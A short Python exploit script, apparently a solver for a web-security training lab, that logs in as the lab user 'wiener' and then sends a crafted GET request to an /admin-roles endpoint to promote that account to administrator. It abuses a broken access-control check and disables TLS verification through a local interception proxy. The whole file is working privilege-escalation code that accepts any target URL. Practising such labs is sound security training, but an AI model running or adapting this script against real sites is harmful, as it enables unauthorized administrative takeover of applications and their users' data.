import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def promote_to_admin(s, url):
    login_url = url + "/login"
    data = {"username": "wiener", "password": "peter"}
    r = s.post(login_url, data=data, proxies=proxies, verify=False)
    res = r.text
    if "Log out" in res:
        print("(+) User 'wiener' logged in successfully.")

        # Eploit the vulnerability to promote 'wiener' to admin
        admin_roles_url = url + "/admin-roles?username=wiener&action=upgrade"
        r = s.get(admin_roles_url, proxies=proxies, verify=False)
        res = r.text
        if "Admin panel" in res:
            print("(+) User 'wiener' promoted to admin successfully.")
        else:
            print("(-) Failed to promote user 'wiener' to admin. Status code: %d" % r.status_code)
            print("(-) Exiting the script.")
            sys.exit(-1)
    else:
        print("(-) Failed to log in as 'wiener'. Status code: %d" % r.status_code)
        print("(-) Exiting the script.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <URL>" % sys.argv[0])
        print("(+) Example: %s https://example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    promote_to_admin(s, url)

if __name__ == "__main__":
    main()